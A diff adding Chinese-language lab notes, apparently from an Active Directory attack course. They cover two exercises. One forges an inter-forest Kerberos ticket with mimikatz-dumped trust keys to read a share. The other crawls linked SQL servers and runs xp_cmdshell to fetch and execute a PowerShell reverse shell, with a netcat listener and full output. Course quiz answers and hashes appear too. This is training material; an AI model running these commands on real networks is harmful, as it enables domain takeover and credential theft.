@@ -3922,7 +3922,7 @@ sc \\dcorp-dc start dns
 Task
 ● Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key.
 
-这一节主要是跨域访问，子域到父域
+这一节主要是跨域访问，子域到父域(Child to Parent)
 
 
 前面已经知道DA管理员Administrator的哈希
@@ -4231,6 +4231,7 @@ d-----        8/20/2020   2:57 AM                Windows
 Task
 ● Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash.
 
+这一节主要是跨域访问，子域到父域(Child to Parent)
 
 下面命令制作一张用户krbtgt到父域的TGT
 由于之前我们已经拿到了krbtgt的hash值，这里直接使用
@@ -4357,85 +4358,7 @@ User : krbtgt
 LM   :
 NTLM : ed277dd7a7a8a88d9ea0de839e454690
 
-RID  : 000001f7 (503)
-User : DefaultAccount
-LM   :
-NTLM :
-
-RID  : 0000b221 (45601)
-User : root359user
-LM   :
-NTLM : aa5f1b91907b8b180a7e8478313e71ad
-
-RID  : 0000b222 (45602)
-User : root360user
-LM   :
-NTLM : aa5f1b91907b8b180a7e8478313e71ad
-
-RID  : 0000b223 (45603)
-User : root361user
-LM   :
-NTLM : aa5f1b91907b8b180a7e8478313e71ad
-
-RID  : 0000b224 (45604)
-User : root362user
-LM   :
-NTLM : aa5f1b91907b8b180a7e8478313e71ad
-
-RID  : 0000b225 (45605)
-User : root363user
-LM   :
-NTLM : aa5f1b91907b8b180a7e8478313e71ad
-
-RID  : 0000b226 (45606)
-User : root364user
-LM   :
-NTLM : aa5f1b91907b8b180a7e8478313e71ad
-
-RID  : 0000b227 (45607)
-User : root365user
-LM   :
-NTLM : aa5f1b91907b8b180a7e8478313e71ad
-
-RID  : 0000b228 (45608)
-User : root366user
-LM   :
-NTLM : aa5f1b91907b8b180a7e8478313e71ad
-
-RID  : 0000b229 (45609)
-User : root367user
-LM   :
-NTLM : aa5f1b91907b8b180a7e8478313e71ad
-
-RID  : 0000b22a (45610)
-User : root368user
-LM   :
-NTLM : aa5f1b91907b8b180a7e8478313e71ad
-
-RID  : 0000b22b (45611)
-User : root369user
-LM   :
-NTLM : aa5f1b91907b8b180a7e8478313e71ad
-
-RID  : 0000b22c (45612)
-User : root370user
-LM   :
-NTLM : aa5f1b91907b8b180a7e8478313e71ad
-
-RID  : 000003e8 (1000)
-User : MCORP-DC$
-LM   :
-NTLM : 1c48ee2123767b65b76d1348360e83f7
-
-RID  : 00000835 (2101)
-User : DCORP-STDADMIN$
-LM   :
-NTLM : 61608ac9d5219aa8ad8c8cf0f547ec2a
-
-RID  : 0000044f (1103)
-User : dcorp$
-LM   :
-NTLM : 13d28ca9e5863231c89eda2b2b1756d7
+[略]
 ```
 
 问题：NTLM hash of krbtgt of moneycorp.local
@@ -4449,3 +4372,380 @@ NTLM : 13d28ca9e5863231c89eda2b2b1756d7
 
 问题：Service for which a TGS is requested from eurocorp-dc
 答案：CIFS（这题应该是Learning Objective - 21）
+
+
+# Learning Objective 21:
+> Task
+> ● With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest.
+
+这一节主要是跨林访问（Across Forest）
+
+用Administrator打开一个DA的shell
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
+```
+
+枚举dcorp-dc的所有trust
+```
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+
+```
+PS C:\ad> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # lsadump::trust /patch
+
+【略】
+
+Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
+    * 1/29/2022 1:20:05 AM - CLEAR   - 1f 6f c4 25 57 c2 50 6e e2 8c b8 94 07 da 97 13 cc 89 5d 6d 0e 47 05 91 74 7c 3a c1
+        * aes256_hmac       91df6bcc4a71d585b710532ff73b662d43e4d83a00821f7d509319e4ce1897c5
+        * aes128_hmac       47f41fc169b79c34d8af08afa3cfdde9
+        * rc4_hmac_nt       cccb3ce736c4d39039b48c79f075a430
+
+ [ Out ] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 1/29/2022 1:20:05 AM - CLEAR   - 1f 6f c4 25 57 c2 50 6e e2 8c b8 94 07 da 97 13 cc 89 5d 6d 0e 47 05 91 74 7c 3a c1
+        * aes256_hmac       1600f6d433093cc534f579dd75b44a8a2f37b983904c507b74f8eb436cd04f4e
+        * aes128_hmac       948cc8e718be3f8eecf498cfa5d6996b
+        * rc4_hmac_nt       cccb3ce736c4d39039b48c79f075a430
+
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
+    * 1/29/2022 1:19:50 AM - CLEAR   - 9e 38 00 0f f1 61 6b 4f 03 ef 9a 4d 66 44 ce 9f 15 1a ee 57 82 dc 5a a0 92 db 99 03
+        * aes256_hmac       d368377248c50ef663e50cf9109512d018b48964ff08e6e06c93ae967ed7ebce
+        * aes128_hmac       f523829c0e7edc43630ed264b7864de9
+        * rc4_hmac_nt       a4ba38d6d528d447371bc2bf9edd8d18
+
+ [Out-1] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 1/29/2022 1:19:50 AM - CLEAR   - 9e 38 00 0f f1 61 6b 4f 03 ef 9a 4d 66 44 ce 9f 15 1a ee 57 82 dc 5a a0 92 db 99 03
+        * aes256_hmac       b21647a7b6a2996c09c96985d907d13d0bb997016bfa177cc89132fdebd7c6c5
+        * aes128_hmac       b7e4341a1b8a9cbe43b8b92447c31c07
+        * rc4_hmac_nt       a4ba38d6d528d447371bc2bf9edd8d18
+```
+EUROCORP.LOCAL 和  DOLLARCORP.MONEYCORP.LOCAL之间有一条信任路径
+
+
+伪造一条到EUROCORP.LOCAL的TGT
+```
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:cccb3ce736c4d39039b48c79f075a430 /service:krbtgt /target:EUROCORP.LOCAL /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi"'
+```
+执行
+```
+PS C:\ad> Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-
+21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:cccb3ce736c4d39039b48c79f075a4
+30 /service:krbtgt /target:EUROCORP.LOCAL /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi"'
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:cccb3ce736c4d39039b48c79f075a430 /service:krbtgt /target:EUROCORP.LOCAL /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi
+User      : Administrator
+Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
+SID       : S-1-5-21-1874506631-3219952063-538504511
+User Id   : 500
+Groups Id : *513 512 520 518 519
+Extra SIDs: S-1-5-21-280534878-1496970234-700767426-519 ;
+ServiceKey: cccb3ce736c4d39039b48c79f075a430 - rc4_hmac_nt
+Service   : krbtgt
+Target    : EUROCORP.LOCAL
+Lifetime  : 2/16/2022 5:20:34 AM ; 2/14/2032 5:20:34 AM ; 2/14/2032 5:20:34 AM
+-> Ticket : C:\AD\kekeo_old\trust_forest_tkt.kirbi
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Final Ticket Saved to file !
+```
+
+制作一张可以访问EUROCORP.LOCAL的TGS
+
+```
+.\asktgs.exe C:\AD\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local
+```
+
+执行：
+```
+PS C:\ad\kekeo_old> .\asktgs.exe C:\AD\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local
+
+  .#####.   AskTGS Kerberos client 1.0 (x86) built on Dec  8 2016 00:31:13
+ .## ^ ##.  "A La Vie, A L'Amour"
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
+  '#####'                                                     * * */
+
+Ticket    : C:\AD\kekeo_old\trust_forest_tkt.kirbi
+Service   : krbtgt / EUROCORP.LOCAL @ dollarcorp.moneycorp.local
+Principal : Administrator @ dollarcorp.moneycorp.local
+
+> CIFS/eurocorp-dc.eurocorp.local
+  * Ticket in file 'CIFS.eurocorp-dc.eurocorp.local.kirbi'
+```
+
+将 TGS 呈现给目标服务
+```
+.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi
+```
+
+执行
+```
+PS C:\ad\kekeo_old> .\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi
+
+  .#####.   KiRBikator 1.1 (x86) built on Dec  8 2016 00:31:14
+ .## ^ ##.  "A La Vie, A L'Amour"
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
+  '#####'                                                     * * */
+
+Destination : Microsoft LSA API (multiple)
+ < .\CIFS.eurocorp-dc.eurocorp.local.kirbi (RFC KRB-CRED (#22))
+ > Ticket Administrator@dollarcorp.moneycorp.local-CIFS~eurocorp-dc.eurocorp.local@EUROCORP.LOCAL : injected
+```
+
+查看目标计算机里的SharedwithDCorp文件夹
+```
+PS C:\ad\kekeo_old> ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
+
+
+    Directory: \\eurocorp-dc.eurocorp.local\SharedwithDCorp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        2/18/2019   3:18 AM             29 secret.txt
+```
+
+拷贝到本地
+```
+PS C:\ad\kekeo_old> copy \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt .\
+```
+
+读取
+```
+PS C:\ad\kekeo_old> cat .\secret.txt
+Dollarcorp DAs can read this!
+```
+
+
+同样的，也可以使用Rubeus.exe，复用上面已经生成的TGT，生成TGS
+```
+.\Rubeus.exe asktgs /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
+```
+
+访问对方林中的计算机
+```
+ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
+```
+
+问题：Contents of secret.txt on eurocorp-dc
+答案：Dollarcorp DAs can read this!
+
+
+# Learning Objective 22:
+> Task
+> ● Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.
+
+## 原理
+微软的SQL 服务通常部署在一个 Windows 域中
+SQL Servers为横向移动提供了非常好的选项，因为域用户可以映射到数据库角色
+数据库链接允许 SQL Server 访问外部数据源，如其他SQL Server和OLE DB 数据源
+如果数据库链接在 SQL 服务器之间，也就是链接的SQL 服务器，则可以执行存储过程，数据库链接甚至可以对跨林信任有效
+
+
+枚举当前账号是否对MSSQLSERVER有权限，收集信息
+```
+PS C:\ad\PowerUpSQL-master> Import-Module .\PowerUpSQL.psd1
+WARNING: The names of some imported commands from the module 'PowerUpSQL' include unapproved verbs that might make them
+ less discoverable. To find the commands with unapproved verbs, run the Import-Module command again with the Verbose
+parameter. For a list of approved verbs, type Get-Verb.
+PS C:\ad\PowerUpSQL-master> Get-SQLInstanceDomain |Get-SQLServerInfo 
+
+ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
+Instance               : DCORP-MSSQL
+DomainName             : dcorp
+ServiceProcessID       : 1724
+ServiceName            : MSSQLSERVER
+ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
+AuthenticationMode     : Windows and SQL Server Authentication
+ForcedEncryption       : 0
+Clustered              : No
+SQLServerVersionNumber : 14.0.1000.169
+SQLServerMajorVersion  : 2017
+SQLServerEdition       : Developer Edition (64-bit)
+SQLServerServicePack   : RTM
+OSArchitecture         : X64
+OsVersionNumber        : SQL
+Currentlogin           : dcorp\student366
+IsSysadmin             : No
+ActiveSessions         : 1
+
+ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
+Instance               : DCORP-MSSQL
+DomainName             : dcorp
+ServiceProcessID       : 1724
+ServiceName            : MSSQLSERVER
+ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
+AuthenticationMode     : Windows and SQL Server Authentication
+ForcedEncryption       : 0
+Clustered              : No
+SQLServerVersionNumber : 14.0.1000.169
+SQLServerMajorVersion  : 2017
+SQLServerEdition       : Developer Edition (64-bit)
+SQLServerServicePack   : RTM
+OSArchitecture         : X64
+OsVersionNumber        : SQL
+Currentlogin           : dcorp\student366
+IsSysadmin             : No
+ActiveSessions         : 1
+```
+
+或者检查当前账号是否有权限进入mssql（如果这里枚举没有Accessible的结果，可以重启一下VM）
+```
+PS C:\ad\PowerUpSQL-master> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 
+
+
+ComputerName                           Instance                                    Status
+------------                           --------                                    ------
+dcorp-mssql.dollarcorp.moneycorp.local dcorp-mssql.dollarcorp.moneycorp.local,1433 Accessible
+dcorp-mssql.dollarcorp.moneycorp.local dcorp-mssql.dollarcorp.moneycorp.local      Accessible
+dcorp-mgmt.dollarcorp.moneycorp.local  dcorp-mgmt.dollarcorp.moneycorp.local       Not Accessible
+dcorp-mgmt.dollarcorp.moneycorp.local  dcorp-mgmt.dollarcorp.moneycorp.local,1433  Not Accessible
+dcorp-sql1.dollarcorp.moneycorp.local  dcorp-sql1.dollarcorp.moneycorp.local       Not Accessible
+dcorp-sql1.dollarcorp.moneycorp.local  dcorp-sql1.dollarcorp.moneycorp.local,1433  Not Accessible
+DCORP-STD366                           DCORP-STD366                                Not Accessible
+```
+
+只有dcorp-mssql.dollarcorp.moneycorp.local 是Accessible
+
+手动枚举mssql链接
+```
+PS C:\ad\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql 
+
+Version     : SQL Server 2017
+Instance    : DCORP-MSSQL
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL}
+User        : dcorp\student366
+Links       : {DCORP-SQL1}
+
+Version     : SQL Server 2017
+Instance    : DCORP-SQL1
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1}
+User        : dblinkuser
+Links       : {DCORP-MGMT}
+
+Version     : SQL Server 2017
+Instance    : DCORP-MGMT
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
+User        : sqluser
+Links       : {EU-SQL.EU.EUROCORP.LOCAL}
+
+Version     : SQL Server 2017
+Instance    : EU-SQL
+CustomQuery :
+Sysadmin    : 1
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
+User        : sa
+Links       :
+```
+
+下面命令执行whoami命令，mysql实例(根据上面枚举到有权限的结果)指定```dcorp-mssql.dollarcorp.moneycorp.local```
+
+```
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local,1433 -Query "exec master..xp_cmdshell 'whoami'"
+```
+
+执行
+```
+PS C:\ad\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"
+
+
+Version     : SQL Server 2017
+Instance    : DCORP-MSSQL
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL}
+User        : dcorp\student366
+Links       : {DCORP-SQL1}
+
+Version     : SQL Server 2017
+Instance    : DCORP-SQL1
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1}
+User        : dblinkuser
+Links       : {DCORP-MGMT}
+
+Version     : SQL Server 2017
+Instance    : DCORP-MGMT
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
+User        : sqluser
+Links       : {EU-SQL.EU.EUROCORP.LOCAL}
+
+Version     : SQL Server 2017
+Instance    : EU-SQL
+CustomQuery : {nt authority\network service, }
+Sysadmin    : 1
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
+User        : sa
+Links       :
+```
+
+在最后一组的CustomQuery里打印出了whoami命令的执行结果：```nt authority\network service```
+
+下面命令触发一个反弹shell
+```
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1'')"'
+```
+
+收到反弹shell
+```
+
+PS C:\Windows\system32> cd c:/ad
+PS C:\ad>
+PS C:\ad> .\nc.exe -lnvp 443
+listening on [any] 443 ...
+connect to [172.16.100.66] from (UNKNOWN) [172.16.15.17] 50260
+Windows PowerShell running as user EU-SQL$ on EU-SQL
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>whoami
+nt authority\network service
+PS C:\Windows\system32> hostname
+eu-sql
+```
+
+问题：First SQL Server linked to dcorp-mssql
+答案：DCORP-SQL1
+
+问题：Name of SQL Server user used to establish link between dcorp-sql1 and dcorp-mgmt
+答案：sqluser
+
+问题：SQL Server privileges on eu-sql
+答案：
+
+问题：Privileges on operating system of eu-sql
+答案：nt authority\network service
+
